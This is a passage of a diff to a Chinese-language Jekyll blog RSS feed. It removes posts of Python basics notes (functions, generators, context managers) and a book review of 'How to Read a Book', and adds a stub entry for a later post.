-Month = Enum('Month', ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'))
-for name, member in Month.__members__.items():
-    print(name, '=&amp;gt;', member, ',', member.value)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;元类&lt;/p&gt;
-
-&lt;p&gt;通过&lt;code class=&quot;highlighter-rouge&quot;&gt;type()&lt;/code&gt;函数可以动态地创建出类&lt;/p&gt;
-
-&lt;p&gt;而元类也是一种动态创建类的流程：先定义metaclass，就可以创建类，最后创建实例。&lt;/p&gt;
-
-&lt;p&gt;常用的会用元类去创建&lt;code class=&quot;highlighter-rouge&quot;&gt;ORM&lt;/code&gt;模型&lt;/p&gt;
-
-&lt;p&gt;上下文管理器&lt;/p&gt;
-
-&lt;p&gt;先看一段代码：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class OpenFile(object):
-    def __init__(self,filename,mode):
-        self.filename=filename
-        self.mode=mode
-    def __enter__(self):
-        self.f=open(self.filename,self.mode)
-        return self.f  #作为as说明符指定的变量的值
-    def __exit__(self,type,value,tb):
-        self.f.close()
-        return False   #异常会被传递出上下文
-with OpenFile('my_file.txt','w') as f:
-    f.write('Hello ')
-    f.write('World')
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OpenFile&lt;/code&gt;实现了一个文件管理器（&lt;code class=&quot;highlighter-rouge&quot;&gt;__enter__&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__exit__&lt;/code&gt;的实现），等价于：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;try ：
-    执行__enter__的内容
-finally：
-    执行__exit__的内容
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;contextmanager装饰器可以方便地实现上下文管理器&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from contextlib import contextmanager
-@contextmanager
-def listTrans(alist):
-    thecopy = list(alist)
-    yield thecopy
-    alist[:]=thecopy
-
-alist=[]
-with listTrans(alist) as working:
-    working.append(1)
-    working.append(2)
-
-print(alist)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;hr /&gt;
-&lt;p&gt;本文大部分内容来自廖雪峰老师的&lt;a href=&quot;http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000&quot;&gt;Python教程&lt;/a&gt;，记录在此只为个人记忆和时常快速翻阅。&lt;/p&gt;
+&lt;p&gt;报名热线：012345678&lt;/p&gt;
 </description>
-        <pubDate>Mon, 26 Jun 2017 21:08:01 +0800</pubDate>
-        <link>http://localhost:4000/2017/06/26/python2/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/06/26/python2/</guid>
+        <pubDate>Fri, 18 Aug 2017 19:50:01 +0800</pubDate>
+        <link>http://localhost:4000/2017/08/18/child-like-phone/</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/08/18/child-like-phone/</guid>
         
         <category>教程</category>
         
         
         <category>document</category>
-        
-      </item>
-    
-      <item>
-        <title>python基础(一)</title>
-        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#数据类型和变量&quot; id=&quot;markdown-toc-数据类型和变量&quot;&gt;数据类型和变量&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#条件控制&quot; id=&quot;markdown-toc-条件控制&quot;&gt;条件控制&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#循环控制&quot; id=&quot;markdown-toc-循环控制&quot;&gt;循环控制&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#list-和-tuple&quot; id=&quot;markdown-toc-list-和-tuple&quot;&gt;list 和 tuple&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#dict和set&quot; id=&quot;markdown-toc-dict和set&quot;&gt;dict和set&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#函数&quot; id=&quot;markdown-toc-函数&quot;&gt;函数&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#生成器&quot; id=&quot;markdown-toc-生成器&quot;&gt;生成器&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#迭代器&quot; id=&quot;markdown-toc-迭代器&quot;&gt;迭代器&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;本片文章记录python一些基本语法和概念。&lt;/p&gt;
-
-&lt;h3 id=&quot;数据类型和变量&quot;&gt;数据类型和变量&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 整数
-a = 1
-# 浮点数
-b = 3.14
-# 字符串，即可以单引号也可以双引号
-c = 'str'
-d = &quot;tes&quot;
-# 布尔值，使用and 和 or 运算符，非传统的&amp;amp;&amp;amp; 和 ||
-e = True
-f = False
-print( e and f)
-print( e or f)
-# 空值
-object = None
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;常量&lt;/p&gt;
-
-&lt;p&gt;在Python中，通常用全部大写的变量名表示常量：&lt;code class=&quot;highlighter-rouge&quot;&gt;PI = 3.14159265359&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;但事实上PI仍然是一个变量，Python根本没有任何机制保证PI不会被改变&lt;/p&gt;
-
-&lt;h3 id=&quot;条件控制&quot;&gt;条件控制&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;age = 3
-if age &amp;gt;= 18:
-    print('adult')
-elif age &amp;gt;= 6:
-    print('teenager')
-else:
-    print('kid')
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;循环控制&quot;&gt;循环控制&lt;/h3&gt;
-&lt;p&gt;python有两种循环&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;for in循环：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;names = ['Michael', 'Bob', 'Tracy']
-for name in names:
-    print(name)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;如果想遍历数组，并获取下标，稍显麻烦：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;names = ['Michael', 'Bob', 'Tracy']
-for index, val in enumerate(names):
-    print 'index is %d, val is %s' % (index, val)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;如果想遍历某范围整数，可用range生成整数序列：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sum = 0
-for x in range(101):
-    sum = sum + x
-print(sum)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;while循环：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sum = 0
-n = 99
-while n &amp;gt; 0:
-    sum = sum + n
-    n = n - 2
-print(sum)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;list-和-tuple&quot;&gt;list 和 tuple&lt;/h3&gt;
-&lt;p&gt;list是一种有序的集合，以中括号表示，可以随时添加和删除其中的元素。&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s = ['python', 'java', p, 'scheme']&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;tuple是另一种有序列表，叫元组，以小括号表示。tuple和list非常类似，但是tuple一旦初始化就不能修改。&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;classmates = ('Michael', 'Bob', 'Tracy')&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;只有1个元素的tuple定义时必须加一个逗号&lt;code class=&quot;highlighter-rouge&quot;&gt;,&lt;/code&gt;，来消除括号计算歧义。&lt;/p&gt;
-
-&lt;p&gt;两种有序列表都是从0开始索引歌，也可以用负数如-1来从最后一个元素开始索引。&lt;/p&gt;
-
-&lt;p&gt;切片&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;L = ['Michael', 'Sarah', 'Tracy', 'Bob', 'Jack']
-# 取前3个元素，从索引0开始取，直到索引3为止，但不包括索引3
-L[0:3]
-
-# 倒数切片
-&amp;gt;&amp;gt;&amp;gt; L[-2:]
-['Bob', 'Jack']
-&amp;gt;&amp;gt;&amp;gt; L[-2:-1]
-['Bob']
-
-# 甚至什么都不写，只写[:]就可以原样复制一个list：
-&amp;gt;&amp;gt;&amp;gt; L[:]
-['Michael', 'Sarah', 'Tracy', 'Bob', 'Jack']
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;字符串也可以使用切片取获取子字符串&lt;/p&gt;
-
-&lt;p&gt;列表生成式 List Comprehensions：使用[]为操作符&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-&amp;gt;&amp;gt;&amp;gt; list(range(1, 11))
-
-# 跟for循环
-&amp;gt;&amp;gt;&amp;gt; [x * x for x in range(1, 11)]
-[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]
-
-# for循环后面再跟if
-&amp;gt;&amp;gt;&amp;gt; [x * x for x in range(1, 11) if x % 2 == 0]
-[4, 16, 36, 64, 100]
-
-# for循环嵌套
-&amp;gt;&amp;gt;&amp;gt; [m + n for m in 'ABC' for n in 'XYZ']
-['AX', 'AY', 'AZ', 'BX', 'BY', 'BZ', 'CX', 'CY', 'CZ']
-
-# 使用两个变量生成list
-&amp;gt;&amp;gt;&amp;gt; d = {'x': 'A', 'y': 'B', 'z': 'C' }
-&amp;gt;&amp;gt;&amp;gt; [k + '=' + v for k, v in d.items()]
-['y=B', 'x=A', 'z=C']
-
-# 把list中字符串变小
-&amp;gt;&amp;gt;&amp;gt; L = ['Hello', 'World', 'IBM', 'Apple']
-&amp;gt;&amp;gt;&amp;gt; [s.lower() for s in L]
-['hello', 'world', 'ibm', 'apple']
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;dict和set&quot;&gt;dict和set&lt;/h3&gt;
-&lt;p&gt;dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d = {'Michael': 95, 'Bob': 75, 'Tracy': 85}
-print(d['Michael'])
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;em&gt;这里不能用js语法。&lt;code class=&quot;highlighter-rouge&quot;&gt;d.Michael&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s = {1, 2, 3}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;可以用set对元素进行过滤&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; s = set([1, 1, 2, 2, 3, 3])
-&amp;gt;&amp;gt;&amp;gt; s
-{1, 2, 3}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;函数&quot;&gt;函数&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;定义函数&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def my_abs(x):
-    if x &amp;gt;= 0:
-        return x
-    else:
-        return -x
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;空函数&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    def nop():
-        pass
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;pass构成语法通过，定义空函数的作用类似于先定义接口，后面再作具体实现。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;返回多个值&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import math
-
-def move(x, y, step, angle=0):
-    nx = x + step * math.cos(angle)
-    ny = y - step * math.sin(angle)
-    return nx, ny
-
-x, y = move(100, 100, 60, math.pi / 6)
-print(x, y)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;实际上返回多个值，是返回了一个tuple，在语法上，&lt;strong&gt;返回一个tuple可以省略括号，而多个变量可以同时接收一个tuple&lt;/strong&gt;，按位置赋给对应的值，所以，Python的函数返回多值其实就是返回一个tuple，但写起来更方便。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; r = move(100, 100, 60, math.pi / 6)
-&amp;gt;&amp;gt;&amp;gt; print(r)
-(151.96152422706632, 70.0)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;再比如：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a, b = b, a + b
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;相当于：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;t = (b, a + b) # t是一个tuple
-a = t[0]
-b = t[1]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;函数参数&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;函数除正常定义的必选参数外，还可以使用默认参数、可变参数和关键字参数等形式，使得函数定义出来的接口，不但能处理复杂的参数，还可以简化调用者的代码。&lt;/p&gt;
-
-&lt;p&gt;默认参数: 同c++一致，默认参数定义在最后面，但切忌使用可变对象作为默认参数：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def add_end(L=[]):
-    L.append('END')
-    return L
-
-&amp;gt;&amp;gt;&amp;gt; add_end()
-    ['END']
-&amp;gt;&amp;gt;&amp;gt; add_end()
-    ['END', 'END']
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;因为L为一个对象，每次调用该函数，如果改变了L的内容，则下次调用时，默认参数的内容就变了，不再是函数定义时的[]了。&lt;/p&gt;
-
-&lt;p&gt;可变参数：顾名思义，可变参数就是传入的参数个数是可变的：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def calc(*numbers):
-    sum = 0
-    for n in numbers:
-        sum = sum + n * n
-    return sum
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;在函数内部，参数numbers接收到的是一个tuple，可以传入任意个参数，包括0个参数。有点类似前面返回多个值，用多个值接受一个tuple的相反情况。&lt;/p&gt;
-
-&lt;p&gt;如果已经有一个list或者tuple，要调用一个可变参数怎么办？可以这样做：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; nums = [1, 2, 3]
-&amp;gt;&amp;gt;&amp;gt; calc(*nums)
-14
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;关键字参数&lt;/p&gt;
-
-&lt;p&gt;可变参数允许你传入0个或任意个参数，这些可变参数在函数调用时自动组装为一个tuple。而关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def person(name, age, **kw):
-    print('name:', name, 'age:', age, 'other:', kw)
-
-&amp;gt;&amp;gt;&amp;gt; person('Bob', 35, city='Beijing')
-name: Bob age: 35 other: {'city': 'Beijing'}
-&amp;gt;&amp;gt;&amp;gt; person('Adam', 45, gender='M', job='Engineer')
-name: Adam age: 45 other: {'gender': 'M', 'job': 'Engineer'}
-
-&amp;gt;&amp;gt;&amp;gt; extra = {'city': 'Beijing', 'job': 'Engineer'}
-&amp;gt;&amp;gt;&amp;gt; person('Jack', 24, city=extra['city'], job=extra['job'])
-name: Jack age: 24 other: {'city': 'Beijing', 'job': 'Engineer'}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;当然，上面复杂的调用可以用简化的写法：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; extra = {'city': 'Beijing', 'job': 'Engineer'}
-&amp;gt;&amp;gt;&amp;gt; person('Jack', 24, **extra)
-name: Jack age: 24 other: {'city': 'Beijing', 'job': 'Engineer'}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;**extra&lt;/code&gt;表示把&lt;code class=&quot;highlighter-rouge&quot;&gt;extra&lt;/code&gt;这个dict的所有key-value用关键字参数传入到函数的**kw参数，kw将获得一个dict，注意kw获得的dict是extra的一份拷贝，对kw的改动不会影响到函数外的extra。&lt;/p&gt;
-
-&lt;p&gt;关键字参数有什么用？它可以扩展函数的功能。比如，在person函数里，我们保证能接收到name和age这两个参数，但是，如果调用者愿意提供更多的参数，我们也能收到。试想你正在做一个用户注册的功能，除了用户名和年龄是必填项外，其他都是可选项，利用关键字参数来定义这个函数就能满足注册的需求。&lt;/p&gt;
-
-&lt;p&gt;命名关键字参数&lt;/p&gt;
-
-&lt;p&gt;如果要限制关键字参数的名字，就可以用命名关键字参数，例如，只接收city和job作为关键字参数。这种方式定义的函数如下：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def person(name, age, *, city, job):
-    print(name, age, city, job)
-
-# 注意调用方式必须指定参数名
-person('Jack', 24, city='Beijing', job='Engineer')
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;参数组合&lt;/p&gt;
-
-&lt;p&gt;在Python中定义函数，可以用必选参数、默认参数、可变参数、关键字参数和命名关键字参数，这5种参数都可以组合使用。参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def f1(a, b, c=0, *args, **kw):
-    print('a =', a, 'b =', b, 'c =', c, 'args =', args, 'kw =', kw)
-
-def f2(a, b, c=0, *, d, **kw):
-    print('a =', a, 'b =', b, 'c =', c, 'd =', d, 'kw =', kw)
-
-&amp;gt;&amp;gt;&amp;gt; f1(1, 2)
-a = 1 b = 2 c = 0 args = () kw = {}
-&amp;gt;&amp;gt;&amp;gt; f1(1, 2, c=3)
-a = 1 b = 2 c = 3 args = () kw = {}
-&amp;gt;&amp;gt;&amp;gt; f1(1, 2, 3, 'a', 'b')
-a = 1 b = 2 c = 3 args = ('a', 'b') kw = {}
-&amp;gt;&amp;gt;&amp;gt; f1(1, 2, 3, 'a', 'b', x=99)
-a = 1 b = 2 c = 3 args = ('a', 'b') kw = {'x': 99}
-&amp;gt;&amp;gt;&amp;gt; f2(1, 2, d=99, ext=None)
-a = 1 b = 2 c = 0 d = 99 kw = {'ext': None}
-
-&amp;gt;&amp;gt;&amp;gt; args = (1, 2, 3, 4)
-&amp;gt;&amp;gt;&amp;gt; kw = {'d': 99, 'x': '#'}
-&amp;gt;&amp;gt;&amp;gt; f1(*args, **kw)
-a = 1 b = 2 c = 3 args = (4,) kw = {'d': 99, 'x': '#'}
-&amp;gt;&amp;gt;&amp;gt; args = (1, 2, 3)
-&amp;gt;&amp;gt;&amp;gt; kw = {'d': 88, 'x': '#'}
-&amp;gt;&amp;gt;&amp;gt; f2(*args, **kw)
-a = 1 b = 2 c = 3 d = 88 kw = {'x': '#'}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;所以，对于任意函数，&lt;strong&gt;都可以通过类似&lt;code class=&quot;highlighter-rouge&quot;&gt;func(*args, **kw)&lt;/code&gt;的形式调用它，无论它的参数是如何定义的&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;生成器&quot;&gt;生成器&lt;/h3&gt;
-&lt;p&gt;使列表元素可以按照某种算法推算出来，不必创建完整的list，从而节省大量的空间，在Python中，这种一边循环一边计算的机制，称为生成器：generator。&lt;/p&gt;
-
-&lt;p&gt;要创建一个generator，有很多种方法。第一种方法很简单，只要把一个列表生成式的[]改成()，就创建了一个generator：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; g = (x * x for x in range(10))
-&amp;gt;&amp;gt;&amp;gt; g
-&amp;lt;generator object &amp;lt;genexpr&amp;gt; at 0x1022ef630&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; next(g)
-0
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;注意这里不是生成tuple，而是一个generator，再比如一个函数generator:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-def fib(max):
-    n, a, b = 0, 0, 1
-    while n &amp;lt; max:
-        yield b
-        a, b = b, a + b
-        n = n + 1
-    yield 'ok'
-    # return 不可以带参数
-    return
-
-&amp;gt;&amp;gt;&amp;gt; f = fib(6)
-&amp;gt;&amp;gt;&amp;gt; next(f)
-
-&amp;gt;&amp;gt;&amp;gt; for n in fib(7):
-...     print(n)
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;使用生成器有两个以下优点：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;节约大量内存
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sum([i for i in xrange(1000000000)])
-sum((i for i in xrange(1000000000)))
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;除了延迟计算，生成器还能有效提高代码可读性。例如，求一段文字中，每个单词出现的位置：&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def index_words(text):
-    if text:
-        yield 0
-    for index, letter in enumerate(text, 1):
-        if letter == ' ':
-            yield index
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;有点需要注意的是：&lt;strong&gt;生成器只能遍历一次&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;迭代器&quot;&gt;迭代器&lt;/h3&gt;
-
-&lt;p&gt;可以直接作用于&lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt;循环的对象统称为可迭代对象：&lt;code class=&quot;highlighter-rouge&quot;&gt;Iterable&lt;/code&gt;，如&lt;code class=&quot;highlighter-rouge&quot;&gt;list&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;tuple&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;dict&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;set&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;str&lt;/code&gt;等。&lt;/p&gt;
-
-&lt;p&gt;可以被&lt;code class=&quot;highlighter-rouge&quot;&gt;next()&lt;/code&gt;函数调用并不断返回下一个值的对象称为迭代器：&lt;code class=&quot;highlighter-rouge&quot;&gt;Iterator&lt;/code&gt;， 如&lt;code class=&quot;highlighter-rouge&quot;&gt;generator&lt;/code&gt;。&lt;/p&gt;
-
-&lt;p&gt;为什么list、dict、str等数据类型不是Iterator？&lt;/p&gt;
-
-&lt;p&gt;Python的Iterator对象表示的是一个数据流，Iterator对象可以被next()函数调用并不断返回下一个数据，直到没有数据时抛出StopIteration错误。可以把这个数据流看做是一个有序序列，但我们却不能提前知道序列的长度，只能不断通过next()函数实现按需计算下一个数据，所以Iterator的计算是惰性的，只有在需要返回下一个数据时它才会计算。&lt;/p&gt;
-
-&lt;hr /&gt;
-&lt;p&gt;本文大部分内容来自廖雪峰老师的&lt;a href=&quot;http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000&quot;&gt;Python教程&lt;/a&gt;，记录在此只为个人记忆和时常快速翻阅。&lt;/p&gt;
-</description>
-        <pubDate>Sun, 25 Jun 2017 21:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2017/06/25/python1/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/06/25/python1/</guid>
-        
-        <category>教程</category>
-        
-        
-        <category>document</category>
-        
-      </item>
-    
-      <item>
-        <title>《如何阅读一本书》</title>
-        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#作者简介&quot; id=&quot;markdown-toc-作者简介&quot;&gt;作者简介&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#作品总结&quot; id=&quot;markdown-toc-作品总结&quot;&gt;作品总结&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#部分摘录&quot; id=&quot;markdown-toc-部分摘录&quot;&gt;部分摘录&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;作者简介&quot;&gt;作者简介&lt;/h3&gt;
-&lt;p&gt;&lt;em&gt;莫提默·J.艾德勒&lt;/em&gt;（Mortimer J.Adler，1902—2001）：生于纽约一个犹太家族。以学者、教育家、编辑等多重面貌享有盛名。除了写作《如何阅读一本书》外，以主编《西方世界的经典》，并担任1974年第十五版《大英百科全书》的编辑指导而闻名于世。一生著作很多，是个伟大的阅读者，也是个伟大的写作者。主要作品有Art, the Arts, and the Great Ideas (1994)、Adler’s Philosophical Dictionary: 125 Key Terms for the Philosopher’s Lexicon (1995)等。&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;查尔斯·范多伦&lt;/em&gt;（1926－ ）: 生于美国书香门第，他的父亲是马克 范多伦，叔叔卡洛 范多伦都是美国哥伦比亚大学文学教授，而且都获得过普利兹奖。他的母亲是作家 桃乐丝 范多伦。先曾任美国哥伦比亚大学教授。最为人知的是1969年由大英百科全书出版公司出版的二十册《美国编年史》（Annals of America）。&lt;/p&gt;
-
-&lt;h3 id=&quot;作品总结&quot;&gt;作品总结&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;这本书主要讲什么？&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;《如何阅读一本书》倡导大家做一个有自我要求的主动阅读者，整理了可操作性很强的一系列阅读规则，去帮助读者，提升自己的阅读技能。汲取更多的知识与收获。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;作者细讲了什么？&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;作者将阅读划分为四个层次：基础阅读、检视阅读、分析阅读、主题阅读，层层递进。具体解释了每个层次阅读的要求，以及每个层次可使用的阅读规则。并针对不同类型的书，细化或修改为具体对应的规则。大致纲要和文摘，可参考后面摘录部分。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;这本书说的有道理吗？&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;在针对论述性作品时，随目前还未使用过这些步骤，但我觉得如果长期针对性训练，使用这些规则，应该是能极大增加个人的阅读效率的。而针对想象文学性作品，作者优化的规则也是很有经验的。而使用辅助性工具时，我觉得可以结合目前的搜索引擎，可达到更高的效率。&lt;/p&gt;
-
